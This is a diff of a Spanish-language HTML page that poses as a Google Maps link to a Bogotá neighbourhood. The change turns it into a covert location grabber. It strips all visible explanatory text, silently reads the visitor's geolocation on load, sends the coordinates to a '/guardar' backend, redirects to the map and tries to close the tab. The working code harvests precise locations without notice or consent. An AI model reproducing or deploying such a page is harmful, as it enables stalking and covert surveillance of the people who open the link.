@@ -1,24 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <title>Ubicación en tiempo real</title>
-  <meta charset="utf-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  
 </head>
 <body>
-  <h2>Mostrando tu ubicación en el mapa...</h2>
-  <p>Espera un momento mientras obtenemos tu ubicación actual.</p>
 
   <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const url = `/guardar?lat=${lat}&lon=${lon}`;
-      fetch(url).then(() => {
-        window.location.href = "https://www.google.com/maps/place/Modelia,+ZONA+5,+Bogot%C3%A1/@4.6696324,-74.12306,15z/data=!3m1!4b1!4m6!3m5!1s0x8e3f9b7ed564f881:0x17e97c13b3148fb5!8m2!3d4.6695391!4d-74.1173893!16s%2Fm%2F0fphzzr?entry=ttu&g_ep=EgoyMDI1MDYxMC4xIKXMDSoASAFQAw%3D%3D" + lat + "," + lon;
-      });
-    }, function(error) {
-      document.body.innerHTML += `<p>No se pudo obtener ubicación: ${error.message}</p>`;
-    });
+    window.onload = function () {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Envía la ubicación al backend
+            fetch(`/guardar?lat=${lat}&lon=${lon}`)
+              .then(() => {
+                // Redirige al usuario
+                window.location.href = "https://www.google.com/maps/place/Normandia,+Teusaquillo,+Bogot%C3%A1,+Colombia/@4.6686671,-74.124538,15z/data=!3m1!4b1!4m6!3m5!1s0x8e3f9b75de1e93eb:0xa6b031209542015c!8m2!3d4.6692679!4d-74.1056435!16s%2Fm%2F0fpjks7?hl=es&entry=ttu&g_ep=EgoyMDI1MDYxMC4xIKXMDSoASAFQAw%3D%3D";
+
+                // Espera 2 segundos y luego intenta cerrar la pestaña
+                setTimeout(() => {
+                  window.close();
+                }, 2000);
+              })
+              .catch((err) => {
+                console.error("Error enviando coordenadas:", err);
+              });
+          },
+          function (error) {
+            console.error("Error obteniendo ubicación:", error);
+          },
+          {
+            enableHighAccuracy: false,
+            timeout: 5000,
+            maximumAge: 60000
+          }
+        );
+      } else {
+        console.log("Geolocalización no disponible en este navegador.");
+      }
+    };
   </script>
 </body>
 </html>
